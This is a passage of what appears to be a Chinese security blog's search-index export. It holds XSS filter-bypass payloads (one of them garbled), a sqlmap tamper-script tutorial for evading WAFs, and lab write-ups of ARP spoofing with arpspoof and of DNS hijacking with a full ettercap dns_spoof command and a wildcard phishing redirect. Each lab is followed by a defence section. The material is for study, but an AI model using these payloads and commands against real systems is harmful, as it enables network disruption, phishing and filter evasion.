class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src onerror=top[<span class="string">&#x27;\x61\x\x65&#x27;</span>](<span class="number">1</span>)&gt;</span><br></pre></td></tr></table></figure><p>拼接关键字</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;self[<span class="string">&#x27;al&#x27;</span>+<span class="string">&#x27;ert&#x27;</span>](<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">parent[<span class="string">&#x27;al&#x27;</span>+<span class="string">&#x27;ert&#x27;</span>](<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">frames[<span class="string">&#x27;al&#x27;</span>+<span class="string">&#x27;ert&#x27;</span>](<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">window</span>[<span class="string">&#x27;al&#x27;</span>+<span class="string">&#x27;ert&#x27;</span>](<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">top[<span class="string">&#x27;al&#x27;</span>+<span class="string">&#x27;ert&#x27;</span>](<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="variable language_">this</span>[<span class="string">&#x27;al&#x27;</span>+<span class="string">&#x27;ert&#x27;</span>](<span class="number">1</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;&lt;script&gt;top[a=<span class="string">&#x27;ert&#x27;</span>,b=<span class="string">&#x27;al&#x27;</span>,b+a](<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">&lt;svg onload=location=[&#x27;javas&#x27;,&#x27;cript:a&#x27;,&#x27;lert(1)&#x27;].join(&#x27;&#x27;)&gt;</span><br><span class="line">&lt;svg onload=location=&#x27;javas&#x27;.concat(&#x27;cript:a&#x27;,&#x27;lert(1)&#x27;)&gt;</span><br><span class="line">&lt;img src onerror=&quot;a=&#x27;ale&#x27;;b=&#x27;rt&#x27;;c=&#x27;(1)&#x27;;eval(a+b+c)&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="0x04-相关资料"><a href="#0x04-相关资料" class="headerlink" title="0x04 相关资料"></a>0x04 相关资料</h3><p><a href="https://byd.dropsec.xyz/2020/10/12/%E9%95%BF%E4%BA%ADWAF%20XSS%E9%98%B2%E6%8A%A4%E7%BB%95%E8%BF%87%E5%B0%8F%E8%AE%B0/">长亭WAF XSS防护绕过小记</a></p><p><a href="https://wizardforcel.gitbooks.io/owasp-cheat-sheet-zh/content/xss-filter-evasion-cheat-sheet.html">XSS过滤绕过备忘录</a></p><p><a href="http://www.hackdig.com/09/hack-473403.htm">XSS各种姿势的学习和个人重要总结</a></p><p><a href="https://www.freebuf.com/articles/others-articles/262407.html">XSS过滤和拦截绕过常用方法</a></p><p><a href="https://www.freebuf.com/articles/web/255655.html">XSS绕过速查表</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>tamper-Sqlmap</title>
      <link href="/article/f7fb60e5.html"/>
      <url>/article/f7fb60e5.html</url>
      
        <content type="html"><![CDATA[<h3 id="tamper-简介"><a href="#tamper-简介" class="headerlink" title="tamper 简介"></a>tamper 简介</h3><p>tamper是SQLMAP提供的用于绕WAF的payload加工脚本，位于sqlmap项目的tamper文件夹中</p><h3 id="tamper-示例结构分析"><a href="#tamper-示例结构分析" class="headerlink" title="tamper 示例结构分析"></a>tamper 示例结构分析</h3><p>下面将通过内置 tamper : escapequotes.py 作为例子分析tamper的结构</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Slash escape single and double quotes (e.g. &#x27; -&gt; \&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;1&quot; AND SLEEP(5)#&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;1\\\\&quot; AND SLEEP(5)#&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>总共分为四个部分：import、priority、dependencies、tamper<br>import：即导入python库，sqlmap已经内置了很多库，此处导入的便是设置tamper优先级的库<br>__priority__：设置tamper优先级，tamper优先级分为LOWEREST、LOWER、LOW、NORMAL、HIGH、HIGHER、HIGHEST。如果在使用过程中需要用到多个tamper来处理payload，那么将会按照优先级从高到低的顺序来执行<br>dependencies：设置本tamper的使用提示，没有就直接pass<br>tamper：tamper脚本处理payload的核心方法，此处就是将单双引号进行转义</p><h3 id="tamper-编写测试"><a href="#tamper-编写测试" class="headerlink" title="tamper 编写测试"></a>tamper 编写测试</h3><p>编写一个tamper，此tamper将关键字select进行大小写绕过</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2023 sqlmap developers (https://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dependencies</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tamper</span>(<span class="params">payload, **kwargs</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replace &#x27;select&#x27; with &#x27;seLeCt&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;select username from users&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;seLeCt username from users&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot;select&quot;</span>,<span class="string">&quot;seLeCt&quot;</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqlmap </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP欺骗</title>
      <link href="/article/808383bb.html"/>
      <url>/article/808383bb.html</url>
      
        <content type="html"><![CDATA[<h3 id="0x00-什么是ARP协议"><a href="#0x00-什么是ARP协议" class="headerlink" title="0x00 什么是ARP协议"></a>0x00 什么是ARP协议</h3><p>ARP（Address Resolution Protocol，地址解析协议）位于TCP&#x2F;IP协议栈中的网络层，负责将某个IP地址解析成对应的MAC地址。以太网（局域网）进行信息传输时，不是根据IP地址进行通信，因为IP地址是可变的，用于通信是不安全的。而MAC地址是网卡的硬件地址，一般出厂后就具有唯一性。ARP协议就是将目标IP地址解析成MAC地址进行验证通信。</p><h3 id="0x01-ARP通信过程"><a href="#0x01-ARP通信过程" class="headerlink" title="0x01 ARP通信过程"></a>0x01 ARP通信过程</h3><p>每台主机都会在自己的ARP高速缓存中建立一个映射表(生存时间10-20分钟)，用于表示IP地址到MAC地址的映射关系。<br>PC1想要和PC2通信，首先PC1会去自己的映射表中查询PC2的MAC地址，如果没查到，PC1就会在本局域网上广播发送一个ARP请求分组，分组主要内容为：我的IP地址是192.168.0.100,MAC地址是00-00-C0-15-AD-18,我想知道IP地址为192.168.0.101的主机(PC2)的MAC地址。<br>在本局域网上的所有主机都会收到该ARP请求分组，别的主机发现请求分组中要查询的IP和自己IP不一致，就会将该分组扔掉，当PC2发现请求分组中要查询的IP和自己一致时，就会收下该请求分组，并向PC1发送ARP响应分组，响应分组主要内容为：我的IP地址是192.168.0.101,MAC地址是08-00-2B-00-EE-0A。此处应注意，响应分组是单播，只会发给PC1，其它主机并不会接收到该分组。<br>PC1收到PC2的响应分组后，就会在其ARP高速缓存中写入PC2的IP地址到MAC地址的映射。</p><h3 id="0x02-ARP协议安全漏洞"><a href="#0x02-ARP协议安全漏洞" class="headerlink" title="0x02 ARP协议安全漏洞"></a>0x02 ARP协议安全漏洞</h3><p>ARP欺骗的根源在于ARP应答处理机制，在ARP协议中规定，对于任何ARP应答都给予信任，没有主动被动确认机制（主动ARP指的是在主动发送ARP请求后在指定时间内收到ARP应答，在请求指定时间外学习的ARP应答都是被动的），因此为伪造ARP应答提供了可乘之机。欺骗者通过轮询各IP地址和MAC地址对应关系并无违规之处，协议规定了对于ARP请求要给予应答。<br>PC和网关被欺骗的直接根源在于被动学习了伪造的ARP应答，如何避免学习伪造ARP应答是防止ARP欺骗的核心。<br>欺骗是分别针对网关和PC的，因为上网是双向流量，网关被欺骗下行数据无法发给PC，PC被欺骗上行数据无法发给网关，所以都会上不了网，只有同时解决网关被欺骗和PC被欺骗，上网才能正常，有不少人误以为只在网关上防止就可以了，这是错误的。还很多时候有人采取重启网关的方式恢复上网，这是因为断电重启后PC、网关都要重新主动学习一次，主动学习是可以学习到正确的映射关系的，所以重启后上网恢复正常，但很有可能过了一段时间后又无法上网了，将网关断电并不是好解决方案。</p><h3 id="0x03-ARP欺骗攻击原理"><a href="#0x03-ARP欺骗攻击原理" class="headerlink" title="0x03 ARP欺骗攻击原理"></a>0x03 ARP欺骗攻击原理</h3><p>这里只研究对PC2进行欺骗，并不对网关进行欺骗，即并不是中间人攻击，此处要达到的效果就是将PC2本来要发给网关的分组发给了攻击机PC1，然后PC1并不会将该分组转给网关，PC1会直接扔掉分组，即PC2不会收到请求的响应，表现为网络中断。</p><p>利用ARP协议的安全漏洞，假设PC1是一台攻击机，当我们知道了受害者PC2的局域网IP地址后，冒充网关(IP:192.168.0.1)，给它发送一个响应分组(并不需要PC2的请求)，其中主要内容为：我的IP地址是192.168.0.1,MAC地址是08-00-2B-00-EE-0A。当PC2收到了该分组，PC2就会将分组中的映射关系更新到自己的映射表中，当PC2想和网关通信时，就会将分组发给PC1,但并不会收到响应，就会出现网络中断。</p><h3 id="0x04-ARP模拟攻击"><a href="#0x04-ARP模拟攻击" class="headerlink" title="0x04 ARP模拟攻击"></a>0x04 ARP模拟攻击</h3><h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><p>攻击机PC1：kali  ,  IP为192.168.0.101<br>受害者PC2：Windows10,  IP为192.168.0.105<br>网关：IP为192.168.0.1<br>工具：arpspoof</p><p>在ARP欺骗前查看一下受害者的映射表<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303191028997.png"><br>此时关于网关的映射为192.168.0.1—-&gt;c8-3a-35-5d-16-60<br>关于攻击机的映射为192.168.0.101—-&gt;00-0c-29-1f-3c-ab</p><p>测试网络情况<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303191036453.png"></p><h4 id="kali进行攻击"><a href="#kali进行攻击" class="headerlink" title="kali进行攻击"></a>kali进行攻击</h4><p>查看局域网主机存活情况<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303191029965.png"><br>可以看到PC2在线，开始攻击<br>-i指定网卡，-t指定目标主机的IP和网关IP,即截获目标主机发给网关的数据包。<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303191032250.png"><br>查看PC2的映射表<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303191030213.png"><br>网关的MAC地址已经被修改为攻击机的MAC地址，显然已经攻击成功</p><p>再次测试网络情况<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303191034244.png"></p><p>停止攻击等待一段时间后，查询受害者的映射表<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303191036503.png"><br>映射表恢复正常，网络正常</p><h3 id="0x05-ARP攻击防御"><a href="#0x05-ARP攻击防御" class="headerlink" title="0x05 ARP攻击防御"></a>0x05 ARP攻击防御</h3><h4 id="网关防御"><a href="#网关防御" class="headerlink" title="网关防御"></a>网关防御</h4><p>授权ARP，授权ARP的原理是摒弃ARP，而是通过DHCP方式来学习各个IP地址和MAC地址的映射关系，端口启动授权ARP后，ARP学习功能自动关闭。其优点是部署方便，只要网关LAN口启动DHCP服务和授权ARP即可，缺点是所有内网PC必须采用DHCP方式获取地址，否则无法上网，对于地址静态设置的内部服务器就不方便了。<br>静态ARP，先通过主动请求或者手动检查每一台PC的IP、MAC地址的映射，即获得一份正确的映射列表，然后通过命令在网关中逐一添加表项，如果收集完整可以在LAN口中关闭ARP学习功能，达到更好效果。优点是可以支持内部PC手工配置地址如内部服务器，缺点也是很明显的，收集工作比较繁杂，PC地址修改后表项失效（因此无法支持DHCP模式），新增加PC后需要添加新的表项。</p><h4 id="PC防御"><a href="#PC防御" class="headerlink" title="PC防御"></a>PC防御</h4><p>PC的任务是访问一些常用地址，如网关，内部服务器，那么PC上也配置这些常用地址的静态ARR就能防止平常上网服务中断，PC有一个缺点是配置静态ARP后无法保存，重启后需要重新配置。注：window PC通过命令行中arp –s 192.168.0.1 00-01-00-01-00-01方式进行静态绑定。</p>]]></content>
      
      
      <categories>
          
          <category> 局域网安全 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DNS劫持</title>
      <link href="/article/cc0e11b5.html"/>
      <url>/article/cc0e11b5.html</url>
      
        <content type="html"><![CDATA[<p>DNS(Domain Name Server，域名服务器)是进行域名(domain name)和与之相对应的IP地址 (IP address)转换的服务器。DNS中保存了一张域名和与之相对应的IP地址的表，以解析消息的域名。<br>当我们在通过网址访问网站时，并不是根据网址中的域名来寻找要请求的服务器，而是会将域名解析为IP地址，根据IP地址来寻找对应服务器。</p><h3 id="0x00-访问网站流程"><a href="#0x00-访问网站流程" class="headerlink" title="0x00 访问网站流程"></a>0x00 访问网站流程</h3><p>在浏览器地址栏输入一个网址时，计算机就会带着该网址中的域名部分去本地计算机的hosts文件中查询该域名对应的IP,如果找到了，则直接访问该IP,如果没找到，则进一步去远程的DNS服务器上找对应域名的IP,找到后访问该IP.</p><h3 id="0x01-DNS劫持原理"><a href="#0x01-DNS劫持原理" class="headerlink" title="0x01 DNS劫持原理"></a>0x01 DNS劫持原理</h3><p>攻击者控制了你的网关或者冒充了你的网关(路由器、交换机、ISP),即先进行了ARP欺骗。当你发送了一个查找域名的IP的请求时，被攻击者拦截，并且返回给你了一个攻击者指定网站的IP,你的浏览器机会把这个IP当作你请求的域名的IP,这时你看到的页面就是攻击者想让你看到的那个页面，常用于钓鱼网站。</p><h3 id="0x02-DNS劫持实验"><a href="#0x02-DNS劫持实验" class="headerlink" title="0x02 DNS劫持实验"></a>0x02 DNS劫持实验</h3><h4 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h4><p>攻击机：kali    IP地址：192.168.0.108<br>受害机：Windows10 IP地址：192.168.0.109<br>服务器：Windows+Phpstudy搭建测试网站 IP地址：192.168.0.101<br>网关：192.168.0.1<br>工具：Ettercap</p><p>攻击前ping百度<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303191132343.png"><br>在kali中起一个Apache服务作为钓鱼网站</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure><h4 id="kali进行攻击"><a href="#kali进行攻击" class="headerlink" title="kali进行攻击"></a>kali进行攻击</h4><p>修改Etter配置文件，设置所有域名都解析到钓鱼网站的IP</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ettercap/etter.dns</span><br></pre></td></tr></table></figure><p>将文件中的其余内容全部注释，然后增加以下两条记录</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*   A       192.168.0.101</span><br><span class="line">*   PTR     192.168.0.101</span><br></pre></td></tr></table></figure><p>发起攻击</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ettercap -Tq -i eth0 -M arp:remote -P dns_spoof /192.168.0.109// /192.168.0.1//</span><br></pre></td></tr></table></figure><p>受害者访问新浪网<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303191133705.png"><br>受害者ping百度<br><img src="https://raw.githubusercontent.com/w1ndyyyy/blog_images/main/202303191133404.png"><br>攻击成功，实验到此结束</p><h3 id="0x03-DNS劫持防御"><a href="#0x03-DNS劫持防御" class="headerlink" title="0x03 DNS劫持防御"></a>0x03 DNS劫持防御</h3><p>尽量使用公共DNS服务器<br>定期检查DN设置是否已修改<br>使用复杂的密码重置路由器的默认密码，即不要使用弱口令<br>使用DNS注册器时使用双因素身份验证，及时修补路由器漏洞<br>远离不受信任的网站，避免在此类网站上下载文件<br>如果已被感染，建议删除HOSTS文件的内容并重置Hosts文件</p>]]></content>
      
      
      <categories>
          
          <category> 局域网安全 </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
